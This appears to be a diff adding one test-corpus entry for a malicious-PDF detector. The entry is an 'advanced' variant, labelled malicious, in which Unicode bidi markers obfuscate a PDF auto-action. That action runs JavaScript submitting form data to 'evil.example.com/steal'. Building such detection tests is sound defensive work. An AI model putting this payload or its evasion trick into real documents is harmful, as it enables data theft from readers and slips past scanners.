@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-pdf::30::unicode-variations::5",
+  "base_sample_id": "exp::document-pdf::30",
+  "generator_id": "unicode-variations",
+  "generator_version": "1.0.0",
+  "seed": -292632420,
+  "content": "‪/AA‬ << /O << ‬/S‬ /JavaScript ‬/JS‬ (this.submitForm(\"http://evil.example.com/steal\")) >> >>\n",
+  "content_hash": "0ea8634b2e2a5193f449d32e7607f15279d84f19450c83cc8968e46aa7b18c82",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "unicode:bidi-markers",
+  "difficulty": "advanced"
+}
